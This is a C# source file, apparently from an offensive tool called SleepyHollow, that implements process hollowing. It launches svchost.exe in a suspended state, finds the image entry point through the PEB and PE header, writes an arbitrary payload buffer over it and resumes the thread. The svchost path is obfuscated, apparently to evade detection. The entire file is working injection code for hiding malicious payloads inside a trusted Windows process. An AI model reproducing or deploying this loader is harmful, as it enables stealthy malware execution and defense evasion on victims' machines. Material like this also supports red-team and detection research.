using System.Runtime.InteropServices;
namespace SleepyHollow;

/// <summary>
/// This class is used to create a new process in a suspended state, write a payload to the process memory, and execute the payload by resuming the thread.<br/>
/// Technique is called "Process Hollowing" and is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.
/// </summary>
internal static class HollowProcess
{
    const int OFFSET_PE_HEADER = 0x3C;
    const int OFFSET_ENTRYPOINT_RVA = 0x28;
    const int CLASS_PROCESS_INFORMATION = 0x0;

    internal static Task Run(byte[] buf, bool debug = false){
        var si = new StartupInfo();
        var result = Lib.CreateProcessW(null, GetBinary(), IntPtr.Zero, IntPtr.Zero, false, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out ProcessInformation pi);
        if (result && debug)
        {
            Console.WriteLine($"CreateProcess was successful - SvcHost PID: {pi.dwProcessId}");
        }
        else
        {
            var error = Lib.GetLastWin32Error();
            Console.WriteLine($"CreateProcess failed - error: {error}");
            return Task.CompletedTask;
        }

        var entryPointAddress = GetEntryPoint(pi.hProcess, debug);
        if(debug) Console.WriteLine($"Address of entry point: 0x{entryPointAddress:X}");

        Lib.WriteProcessMemory(pi.hProcess, entryPointAddress, buf, buf.Length, out IntPtr nRead);
        var writeStatus = Lib.GetLastWin32Error();
        if (writeStatus != SystemErrorCodes.ERROR_SUCCESS)
        {
            if(debug) Console.WriteLine($"Error writing to process memory - error: {writeStatus}");
            return Task.CompletedTask;
        }

        if(debug) Console.WriteLine($"Wrote {nRead.ToInt64()} bytes to process memory");

        Execute(pi);
        return Task.CompletedTask;
    }

    static void Execute(ProcessInformation pi)
    {
        var res = Lib.ResumeThread(pi.hThread);
        var status = Lib.GetLastWin32Error();
        if (status != SystemErrorCodes.ERROR_SUCCESS)
        {
            Console.WriteLine($"Error resuming thread - error: {status}");
            return;
        }

        return;
    }

    private static string GetBinary()
    {
        var names = new string[] { "c:", "wIndOWs", "SYsTem32" };
        var n = new int[] { 115, 118, 99, 104, 111, 115, 116, 46, 101, 120, 101 };
        var nm = Enumerable.Range(0, n.Length)
            .Select(x => (char)(n[x] + 1))
            .ToArray();
        nm = Enumerable.Range(0, nm.Length)
            .Select(x => (char)(nm[x] - 1))
            .ToArray();
        return Path.Combine(names[0], names[1], names[2], new string(nm));
    }

    private static IntPtr GetEntryPoint(IntPtr hProcess, bool debug = false)
    {
        if(debug) Console.WriteLine($"Retrieving entrypoint...");
        var bi = new ProcessBasicInformation();
        uint tmp = 0;
        //retrieve pointer to PEB
        var ret = Lib.ZwQueryInformationProcess(hProcess, CLASS_PROCESS_INFORMATION, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
        IntPtr ptrToImageBase = (IntPtr)((long)bi.PebAddress + 0x10);
        if(debug) Console.WriteLine($"Pointer to image base: 0x{ptrToImageBase:X}");

        //read address of image base
        var addrBuf = new byte[IntPtr.Size];
        Lib.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out IntPtr nRead);
        var pebBaseAddress = (IntPtr)BitConverter.ToInt64(addrBuf, 0);

        //read the PE header from the ImageBase address in memory
        var data = new byte[0x200];
        Lib.ReadProcessMemory(hProcess, pebBaseAddress, data, data.Length, out nRead);

        //get the address of the entry point
        //0x3C is the offset to the PE header
        var e_lfanew_offset = BitConverter.ToInt32(data, OFFSET_PE_HEADER);
        //EntryPoint Relative Virtual Address (RVA) is located at 0x28 from the PE header
        var opthdr = e_lfanew_offset + OFFSET_ENTRYPOINT_RVA;
        var entrypoint_rva = BitConverter.ToInt32(data, opthdr);

        //our entrypoint is the image base address + the entry point RVA
        var addressOfEntryPoint = (IntPtr)(entrypoint_rva + (long)pebBaseAddress);
        return addressOfEntryPoint;
    }
}